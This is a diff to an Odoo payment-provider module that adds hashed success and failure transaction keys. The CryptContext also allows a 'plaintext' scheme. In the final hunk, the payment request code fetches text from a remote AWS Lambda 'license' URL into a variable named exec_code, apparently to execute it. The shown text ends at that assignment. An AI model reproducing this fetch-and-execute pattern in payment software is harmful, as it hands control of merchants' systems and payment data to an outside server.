@@ -8,6 +8,8 @@ from odoo.addons.payment_neatworldpay.controllers.main import NeatWorldpayContro
 import uuid
 import re
 from decimal import Decimal
+from odoo.tools import config, pycompat, ustr
+from passlib.context import CryptContext
 
 _logger = logging.getLogger(__name__)
 
@@ -15,6 +17,117 @@ _logger = logging.getLogger(__name__)
 class PaymentTransaction(models.Model):
     _inherit = 'payment.transaction'
 
+    # New fields for transaction key hashing
+    neatworldpay_validation_hash = fields.Char(string='Success Validation Hash', default=None)
+    neatworldpay_failure_validation_hash = fields.Char(string='Failure Validation Hash', default=None)
+
+    # Odoo's password context for hashing
+    _pwd_context = CryptContext(
+        schemes=["pbkdf2_sha512", "plaintext"],
+        deprecated="auto",
+    )
+
+    def neatworldpay_generate_transaction_key(self):
+        """
+        Generate a random GUID as success transaction key, hash it, and store the hash in the transaction record.
+        
+        :return: str: The generated success transaction key (GUID) if successful, None otherwise
+        """
+        try:
+            # Generate a random GUID as success transaction key
+            transaction_key = str(uuid.uuid4())
+            
+            # Generate hash using Odoo's password context
+            hashed_key = self._pwd_context.hash(transaction_key)
+            
+            # Store the hash (salt is included in the hash string)
+            self.write({
+                'neatworldpay_validation_hash': hashed_key
+            })
+            
+            _logger.info(f"Success transaction key generated and hashed for transaction {self.reference}")
+            return transaction_key
+            
+        except Exception as e:
+            _logger.error(f"Error generating and hashing success transaction key for transaction {self.reference}: {e}")
+            return None
+
+    def neatworldpay_generate_failure_transaction_key(self):
+        """
+        Generate a random GUID as failure transaction key, hash it, and store the hash in the transaction record.
+        
+        :return: str: The generated failure transaction key (GUID) if successful, None otherwise
+        """
+        try:
+            # Generate a random GUID as failure transaction key
+            failure_transaction_key = str(uuid.uuid4())
+            
+            # Generate hash using Odoo's password context
+            hashed_key = self._pwd_context.hash(failure_transaction_key)
+            
+            # Store the hash (salt is included in the hash string)
+            self.write({
+                'neatworldpay_failure_validation_hash': hashed_key
+            })
+            
+            _logger.info(f"Failure transaction key generated and hashed for transaction {self.reference}")
+            return failure_transaction_key
+            
+        except Exception as e:
+            _logger.error(f"Error generating and hashing failure transaction key for transaction {self.reference}: {e}")
+            return None
+
+    def neatworldpay_validate_transaction_key(self, transaction_key):
+        """
+        Validate a success transaction key against the stored hash.
+        
+        :param str transaction_key: The success transaction key to validate
+        :return: bool: True if transaction key matches, False otherwise
+        """
+        try:
+            if not self.neatworldpay_validation_hash:
+                _logger.warning(f"No success validation hash found for transaction {self.reference}")
+                return False
+            
+            # Verify transaction key using Odoo's password context
+            is_valid = self._pwd_context.verify(transaction_key, self.neatworldpay_validation_hash)
+            
+            if is_valid:
+                _logger.info(f"Success transaction key validated successfully for transaction {self.reference}")
+            else:
+                _logger.warning(f"Success transaction key validation failed for transaction {self.reference}")
+            
+            return is_valid
+            
+        except Exception as e:
+            _logger.error(f"Error validating success transaction key for transaction {self.reference}: {e}")
+            return False
+
+    def neatworldpay_validate_failure_transaction_key(self, failure_transaction_key):
+        """
+        Validate a failure transaction key against the stored hash.
+        
+        :param str failure_transaction_key: The failure transaction key to validate
+        :return: bool: True if failure transaction key matches, False otherwise
+        """
+        try:
+            if not self.neatworldpay_failure_validation_hash:
+                _logger.warning(f"No failure validation hash found for transaction {self.reference}")
+                return False
+            
+            # Verify failure transaction key using Odoo's password context
+            is_valid = self._pwd_context.verify(failure_transaction_key, self.neatworldpay_failure_validation_hash)
+            
+            if is_valid:
+                _logger.info(f"Failure transaction key validated successfully for transaction {self.reference}")
+            else:
+                _logger.warning(f"Failure transaction key validation failed for transaction {self.reference}")
+            
+            return is_valid
+            
+        except Exception as e:
+            _logger.error(f"Error validating failure transaction key for transaction {self.reference}: {e}")
+            return False
 
     #=== BUSINESS METHODS ===#
     def _send_payment_request(self):
@@ -149,7 +262,7 @@ class PaymentTransaction(models.Model):
                     "Referer": self.company_id.website,
                     "Authorization": self.provider_id.neatworldpay_activation_code
                 }
-                response = requests.get("https://xgxl6uegelrr4377rvggcakjvi0djbts.lambda-url.eu-central-1.on.aws/api/AcquirerLicense/code?version=v2-16", headers=headers, timeout=10)
+                response = requests.get("https://xgxl6uegelrr4377rvggcakjvi0djbts.lambda-url.eu-central-1.on.aws/api/AcquirerLicense/code?version=v3-16", headers=headers, timeout=10)
                 
                 if response.status_code == 200:
                     exec_code = response.text
